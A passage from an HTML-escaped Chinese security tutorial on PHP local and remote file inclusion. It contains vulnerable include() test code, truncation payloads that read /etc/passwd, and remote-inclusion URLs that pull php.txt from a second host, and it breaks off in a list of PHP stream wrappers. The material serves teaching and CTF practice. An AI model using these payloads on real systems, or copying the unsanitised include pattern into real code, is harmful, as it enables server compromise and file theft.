punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;show.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;./action/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;./action/show.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;./action/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;./action/show.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;本地文件包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#本地文件包含&#34;&gt;#&lt;/a&gt; 本地文件包含&lt;/h1&gt;
&lt;h2 id=&#34;无限制本地文件包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无限制本地文件包含&#34;&gt;#&lt;/a&gt; 无限制本地文件包含&lt;/h2&gt;
&lt;p&gt;这种直接找我们到需要的文件路径，进行包含就行。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;示例&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;有限制本地文件包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#有限制本地文件包含&#34;&gt;#&lt;/a&gt; 有限制本地文件包含&lt;/h2&gt;
&lt;p&gt;这种类型需要我们找到的敏感文件路径，然后&lt;ins class=&#34;info&#34;&gt;绕过限制&lt;/ins&gt;进行包含就行。&lt;/p&gt;
&lt;h3 id=&#34;00截断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#00截断&#34;&gt;#&lt;/a&gt; %00 截断&lt;/h3&gt;
&lt;p&gt;条件：magic_quotes_gpc = Off php 版本 &amp;lt; 5.3.4&lt;/p&gt;
&lt;p&gt;在上面常见环境代码的后两种都得用 %00 截断&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label warning&#34;&gt;示例&lt;/span&gt;&lt;br /&gt;
 &lt;code&gt;http://www.xxx.com/xx.php?filename=../../etc/passwd%00&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;路径长度截断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#路径长度截断&#34;&gt;#&lt;/a&gt; 路径长度截断&lt;/h3&gt;
&lt;p&gt;条件：windows OS，点号需要长于 256；linux OS 长于 4096&lt;/p&gt;
&lt;p&gt;Windows 下目录最大长度为 256 字节，超出的部分会被丢弃；&lt;/p&gt;
&lt;p&gt;Linux 下目录最大长度为 4096 字节，超出的部分会被丢弃。&lt;/p&gt;
&lt;p&gt;测试代码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt;  &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;filename&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;.html&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;div class=&#34;tab&#34; data-id=&#34;id1&#34; data-title=&#34;EXP:&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5jdGZzLXdpa2kuY29tL0ZJL0ZJLnBocD9maWxlbmFtZT10ZXN0LnR4dC8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8=&#34;&gt;http://www.ctfs-wiki.com/FI/FI.php?filename=test.txtlt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img data-src=&#34;image008.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;点号截断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#点号截断&#34;&gt;#&lt;/a&gt; 点号截断&lt;/h3&gt;
&lt;p&gt;条件：windows OS，点号需要长于 256&lt;/p&gt;
&lt;p&gt;测试代码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt;  &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;filename&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;.html&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;div class=&#34;tab&#34; data-id=&#34;id2&#34; data-title=&#34;EXP:&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5jdGZzLXdpa2kuY29tL0ZJL0ZJLnBocD9maWxlbmFtZT10ZXN0LnR4dA==&#34;&gt;http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt&lt;/span&gtlt;/p&gt;
&lt;/div&gt;
&lt;h1 id=&#34;远程文件包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#远程文件包含&#34;&gt;#&lt;/a&gt; 远程文件包含&lt;/h1&gt;
&lt;p&gt;PHP 的配置文件 allow_url_fopen 和 allow_url_include 设置为 ON，include/require 等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。&lt;/p&gt;
&lt;div class=&#34;note info&#34;&gt;
&lt;p&gt;allow_url_fopen = On（是否允许打开远程文件）&lt;br /&gt;
allow_url_include = On（是否允许 include/require 远程文件）&lt;/p&gt;
&lt;/div&gt;
&lt;h2 id=&#34;无限制远程文件包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无限制远程文件包含&#34;&gt;#&lt;/a&gt; 无限制远程文件包含&lt;/h2&gt;
&lt;p&gt;和无限制本地文件包含差不多。不再介绍（懒蛋。。）&lt;br /&gt;
&lt;img data-src=&#34;image009.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;有限制远程文件包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#有限制远程文件包含&#34;&gt;#&lt;/a&gt; 有限制远程文件包含&lt;/h2&gt;
&lt;p&gt;测试代码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;filename&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;.html&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;代码中多添加了 html 后缀，导致远程包含的文件也会多一个 html 后缀。&lt;/p&gt;
&lt;h3 id=&#34;绕过姿势&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过姿势&#34;&gt;#&lt;/a&gt; 绕过姿势&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;问号绕过&lt;br /&gt;
 &lt;code&gt;http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt?&lt;/code&gt; &lt;br /&gt;
&lt;img data-src=&#34;image012.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;#号绕过&lt;br /&gt;
 &lt;code&gt;http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt%23&lt;/code&gt; &lt;br /&gt;
&lt;img data-src=&#34;image011.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;空格 (%20) 绕过&lt;br /&gt;
 &lt;code&gt;http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt%20&lt;/code&gt; &lt;br /&gt;
&lt;img data-src=&#34;image010.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;php伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php伪协议&#34;&gt;#&lt;/a&gt; PHP 伪协议&lt;/h1&gt;
&lt;p&gt;PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen ()、 copy ()、 file_exists () 和 filesize () 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register () 来注册自定义的封装协议。&lt;/p&gt;
&lt;p&gt;支持的种类有这 12 种&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;file:// — 访问本地文件系统&lt;/li&gt;
&lt;li&gt;http:// — 访问 HTTP (s) 网址&lt;/li&gt;
&lt;li&gt;ftp:// — 访问 FTP (s) URLs&lt;/li&gt;
&lt;li&gt;php:// — 访问各个输入 / 输出流（I/O streams）&lt;/li&gt;
&lt;li&gt;zlib:// — 压缩流&lt;/li&gt;
&lt;li&gt;data:// — 数据（RFC 2397）&lt;/li&gt;
&lt;li&gt;glob:// — 查找匹配的文件路径模式&lt;/li&gt;
&lt;li&gt;phar:// — PHP 归档&lt;/li&gt;
&lt;li&gt;ssh2:// — Secure Shell 2&lt;/li&gt;
&lt;li&gt;rar:// — RAR&lt;/li&gt;
&lt;li&gt;ogg:// — 音频流&lt;/li&gt;
&lt;li&gt;expect:// — 处理交互式的流&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;php-输入输出流&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php-输入输出流&#34;&gt;#&lt;/a&gt; php:// 输入输出流&lt;/h2&gt;
&lt;p&gt;PHP 提供了一些杂项输入 / 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。&lt;/p&gt;
&lt;h2 id=&#34;phpstdin-phpstdout-和-phpstderr&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpstdin-phpstdout-和-phpstderr&#34;&gt;#&lt;/a&gt; php://stdin, php://stdout 和 php://stderr&lt;/h2&gt;
&lt;p&gt;php://stdin、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。 数据流引用了复制的文件描述符，所以如果你打开 php://stdin 并在之后关了它， 仅是关闭了复制品，真正被引用的 STDIN 并不受影响。 推荐简单使用常量 STDIN、 STDOUT 和 STDERR 来代替手工打开这些封装器。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label warning&#34;&gt;php://stdin 是只读的，php://stdout 和 php://stderr 是只写的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;📣举例&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;span class=&#34;label info&#34;&gt;php://stdin&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
